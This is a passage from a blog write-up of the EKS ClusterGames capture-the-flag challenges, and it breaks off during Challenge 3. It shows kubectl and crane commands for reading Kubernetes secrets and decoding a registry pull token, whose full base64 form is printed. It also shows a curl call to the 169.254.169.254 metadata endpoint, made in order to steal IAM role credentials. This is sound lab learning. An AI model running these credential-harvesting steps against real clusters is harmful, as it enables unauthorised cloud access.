<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" 
  
    data-mode="dark"
  
>
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="EKS ClusterGames Writeups" />
<meta property="og:locale" content="en" />
<meta name="description" content="I will be discussing my approaches for solving EKS ClusterGames challenges. So let’s start…. Challenge 1: Secret Seeker" />
<meta property="og:description" content="I will be discussing my approaches for solving EKS ClusterGames challenges. So let’s start…. Challenge 1: Secret Seeker" />
<link rel="canonical" href="http://localhost:4000/posts/EKS-ClusterGames-Writeups/" />
<meta property="og:url" content="http://localhost:4000/posts/EKS-ClusterGames-Writeups/" />
<meta property="og:site_name" content="Sl4y3r_07" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-29T09:41:40+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="EKS ClusterGames Writeups" />
<meta name="twitter:site" content="@twitter_username" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-08-29T09:41:40+05:30","datePublished":"2025-08-29T09:41:40+05:30","description":"I will be discussing my approaches for solving EKS ClusterGames challenges. So let’s start…. Challenge 1: Secret Seeker","headline":"EKS ClusterGames Writeups","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/EKS-ClusterGames-Writeups/"},"url":"http://localhost:4000/posts/EKS-ClusterGames-Writeups/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>EKS ClusterGames Writeups | Sl4y3r_07
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Sl4y3r_07">
<meta name="application-name" content="Sl4y3r_07">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <div class="site-title">
      <a href="/">Sl4y3r_07</a>
    </div>
    <div class="site-subtitle fst-italic">Exploring the world of Tech..</div>
  </div>
  <!-- .profile-wrapper -->

  <ul class="nav flex-column flex-grow-1 w-100 ps-0">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
      <li class="nav-item">
        <a href="/categories/" class="nav-link">
          <i class="fa-fw fas fa-stream"></i>
          

          <span>CATEGORIES</span>
        </a>
      </li>
      <!-- .nav-item -->
    
      <li class="nav-item">
        <a href="/tags/" class="nav-link">
          <i class="fa-fw fas fa-tags"></i>
          

          <span>TAGS</span>
        </a>
      </li>
      <!-- .nav-item -->
    
      <li class="nav-item">
        <a href="/archives/" class="nav-link">
          <i class="fa-fw fas fa-archive"></i>
          

          <span>ARCHIVES</span>
        </a>
      </li>
      <!-- .nav-item -->
    
      <li class="nav-item">
        <a href="/about/" class="nav-link">
          <i class="fa-fw fas fa-info-circle"></i>
          

          <span>ABOUT</span>
        </a>
      </li>
      <!-- .nav-item -->
    
  </ul>
  <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/Sl4y3r-07"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/twitter_username"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['ayushg3007','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
      

      
    
  </div>
  <!-- .sidebar-bottom -->
</div>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container px-xxl-5">
        <!-- The Top Bar -->

<div id="topbar-wrapper">
  <div
    id="topbar"
    class="container d-flex align-items-center justify-content-between h-100"
  >
    <span id="breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>EKS ClusterGames Writeups</span>
            

          
        
      
    </span>
    <!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </span>
    <span id="search-cancel">Cancel</span>
  </div>
</div>

        











<div class="row">
  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4">
    

    <div class="post px-1 px-md-2">
      

      
        
      
        <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->



  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- return -->




<h1 data-toc-skip>EKS ClusterGames Writeups</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class=""
  data-ts="1756440700"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 29, 2025
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/username">Ayush Goyal</a>
      
      </em>
    </span>

    <div>
      <!-- read time -->
      <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1660 words"
>
  <em>9 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>I will be discussing my approaches for solving <a href="https://eksclustergames.com/">EKS ClusterGames</a> challenges. So let’s start….</p>
<h3 id="challenge-1-secret-seeker"><span class="me-2">Challenge 1: Secret Seeker</span><a href="#challenge-1-secret-seeker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">Description</code>: Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>

<p>Permissions:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>{
    "secrets": [
        "get",
        "list"
    ]
}
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/eks/rbac_error.png" class="popup img-link "><img data-src="/assets/eks/rbac_error.png" alt="rbac_error" class="lazyload" data-proofer-ignore></a></p>

<p>So, here is the RBAC (Role-Based Access Control) issue in Kubernetes. What is RBAC?</p>
<blockquote>
  <p><em><code class="language-plaintext highlighter-rouge">Role-Based Access Control (RBAC)</code></em> in Kubernetes is a security mechanism that regulates who can access what resources within a Kubernetes cluster and what actions they can perform on those resources.</p>
</blockquote>

<p>It means we cannot access resources like pods, replicasets or deployments. It only grants permission to <code class="language-plaintext highlighter-rouge">get</code> and <code class="language-plaintext highlighter-rouge">list</code> secrets [refer to the permissions].</p>

<blockquote>
  <p>A <code class="language-plaintext highlighter-rouge">Secret</code> is an object that contains a small amount of sensitive data such as a password, a token, or a key <a href="https://kubernetes.io/docs/concepts/configuration/secret/">reference</a></p>
</blockquote>

<p>Now, list the secrets..</p>

<p><a href="/assets/eks/secrets.png" class="popup img-link "><img data-src="/assets/eks/secrets.png" alt="secrets" class="lazyload" data-proofer-ignore></a></p>

<p><a href="/assets/eks/flag.png" class="popup img-link "><img data-src="/assets/eks/flag.png" alt="flag" class="lazyload" data-proofer-ignore></a> 
Decoded the base64 and got the flag.</p>

<p>flag: <code class="language-plaintext highlighter-rouge">wiz_eks_challenge{omg_over_privileged_secret_access}</code></p>

<h3 id="challenge-2-registry-hunt"><span class="me-2">Challenge 2: Registry Hunt</span><a href="#challenge-2-registry-hunt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">Description</code>: A thing we learned during our research: always check the container registries. For your convenience, the crane utility is already pre-installed on the machine.</p>

<p>Permissions:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
</pre></td></tr></tbody></table></code></div></div>
<p>In this challenge, we have the permissions to <code class="language-plaintext highlighter-rouge">list</code> the pods.</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>kubectl get pods
NAME                    READY   STATUS    RESTARTS      AGE
database-pod-14f9769b   1/1     Running   9 (28d ago)   355d
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p>This time we dont have permission to list the secrets 
<a href="/assets/eks/no_perm.png" class="popup img-link "><img data-src="/assets/eks/no_perm.png" alt="no_perm" class="lazyload" data-proofer-ignore></a></p>
  </li>
  <li>
    <p>According to the description, we need to check <code class="language-plaintext highlighter-rouge">container registeries</code>. So let’s look at the detailed view of the pod.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">kubectl get pods database-pod-14f9769b -o yaml</code></p>
  </li>
</ul>

<p><a href="/assets/eks/imagePull.png" class="popup img-link "><img data-src="/assets/eks/imagePull.png" alt="imagePull" class="lazyload" data-proofer-ignore></a></p>

<ul>
  <li>In the above image, we have the image:<code class="language-plaintext highlighter-rouge">eksclustergames/base_ext_image</code> and need to pull it. But how ?</li>
</ul>

<p><a href="/assets/eks/imagePull_failure.png" class="popup img-link "><img data-src="/assets/eks/imagePull_failure.png" alt="imagePull_failure" class="lazyload" data-proofer-ignore></a></p>
<ul>
  <li>We need to authenticate first, but from where we can get the credentials?
    <blockquote>
      <p>The answer lies in <code class="language-plaintext highlighter-rouge">secrets</code>. But we can’t list them, then how? When a pod needs to pull an image from a private registry, its Pod specification references the image pull secret in the <code class="language-plaintext highlighter-rouge">imagePullSecrets</code> field</p>
    </blockquote>
  </li>
  <li>Now, we got the secret name…</li>
  <li><code class="language-plaintext highlighter-rouge">kubectl get secrets  registry-pull-secrets-16ae8e51 -o yaml</code></li>
</ul>

<p><a href="/assets/eks/secrets_chall2.png" class="popup img-link "><img data-src="/assets/eks/secrets_chall2.png" alt="secrets_chall2" class="lazyload" data-proofer-ignore></a></p>

<p><a href="/assets/eks/base64d.png" class="popup img-link "><img data-src="/assets/eks/base64d.png" alt="base64d" class="lazyload" data-proofer-ignore></a></p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">echo ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==  | base64 -d</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">eksclustergames:dckr_[.....]5iYQj8FuCo</code> -&gt; The format is username:password</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">crane auth login docker.io -u eksclustergames -p dckr_[.....]5iYQj8FuCo </code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">crane pull eksclustergames/base_ext_image ./image.tar
</code>
<a href="/assets/eks/flag2.png" class="popup img-link "><img data-src="/assets/eks/flag2.png" alt="flag2" class="lazyload" data-proofer-ignore></a></p>
  </li>
</ul>

<p>flag: <code class="language-plaintext highlighter-rouge">wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}</code></p>

<h3 id="challenge-3-image-inquistion"><span class="me-2">Challenge 3: Image Inquistion</span><a href="#challenge-3-image-inquistion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">Description</code>: A pod’s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</p>

<p>Remember: You are running inside a compromised EKS pod.</p>

<p>Permissions:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>{
    "pods": [
        "list",
        "get"
    ]
}
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li>This time no permission to secrets. :(</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>kubectl get pods 
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-acbd5209   1/1     Running   0          13d
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">A pod's image holds more than just code</code> interesting!</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>kubectl get pods accounting-pod-acbd5209  -o yaml | grep image    
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
    imagePullPolicy: IfNotPresent
    image: sha256:c5e09ea1551a1976284b15c1d5e856cbda91b98e04a7e88f517a182f29b0c914
    imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
</pre></td></tr></tbody></table></code></div></div>
<p>The challenge description says to <code class="language-plaintext highlighter-rouge">deep dive into its ECR reposioty</code>. Let’s look at what ECR repo is.</p>

<blockquote>
  <p>Amazon Elastic Container Registry (ECR) is a fully managed container image registry service provided by Amazon Web Services (AWS). It is used to store, manage, and deploy Docker container images. In the context of Kubernetes, ECR repositories serve as the source from which Kubernetes clusters, particularly those running on AWS services like Amazon Elastic Kubernetes Service (EKS), pull container images to deploy and run applications.</p>
</blockquote>

<ul>
  <li>The repo URL looks like 
<code class="language-plaintext highlighter-rouge">&lt;aws_account_id&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repository_name&gt;</code></li>
</ul>

<p>So we have to pull the exact image from the ECR.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"> <span class="o">&gt;</span> <span class="n">crane</span> <span class="n">pull</span> <span class="mf">688655246681.</span><span class="n">dkr</span><span class="p">.</span><span class="n">ecr</span><span class="p">.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">central_repo</span><span class="o">-</span><span class="mi">579</span><span class="n">b0b7</span><span class="o">/</span><span class="n">manifests</span><span class="o">/</span><span class="n">sha256</span><span class="p">:</span><span class="mi">78</span><span class="n">ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4</span> <span class="p">.</span><span class="o">/</span><span class="n">image</span><span class="p">.</span><span class="n">tar</span>

 <span class="n">Error</span><span class="p">:</span> <span class="n">GET</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">688655246681.</span><span class="n">dkr</span><span class="p">.</span><span class="n">ecr</span><span class="p">.</span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mf">1.</span><span class="n">amazonaws</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">central_repo</span><span class="o">-</span><span class="mi">579</span><span class="n">b0b7</span><span class="o">/</span><span class="n">manifests</span><span class="o">/</span><span class="n">sha256</span><span class="o">/</span><span class="n">manifests</span><span class="o">/</span><span class="mi">78</span><span class="n">ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4</span><span class="p">:</span> <span class="n">unexpected</span> <span class="n">status</span> <span class="n">code</span> <span class="mi">401</span> <span class="n">Unauthorized</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Authorized</span></code></pre></figure>

<p>We need the credentials. How can we get them?</p>

<p>I got this command from exploring a bit. 
<code class="language-plaintext highlighter-rouge">aws ecr get-login-password --region us-west-1</code> 
But, it doesn’t work and told me to use <code class="language-plaintext highlighter-rouge">aws configure</code>, that means my AWS is not configured yet.</p>

<ul>
  <li>
    <p>Another way is to check if IAM role is attached to this instance, by making a request to <code class="language-plaintext highlighter-rouge">IMDS (Instance Metadata Service)</code>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">curl 169.254.169.254/latest/meta-data/</code></p>
  </li>
</ul>

<p><a href="/assets/eks/iam.png" class="popup img-link "><img data-src="/assets/eks/iam.png" alt="iam" class="lazyload" data-proofer-ignore></a></p>

<p>So, we can see <code class="language-plaintext highlighter-rouge">iam</code> is present. Cool, let’s dig further.</p>

<blockquote>
  <p>Security Concerns: If an attacker inside your pod/VM can reach 169.254.169.254, they might steal IAM role credentials. And we are going to do the same :p</p>
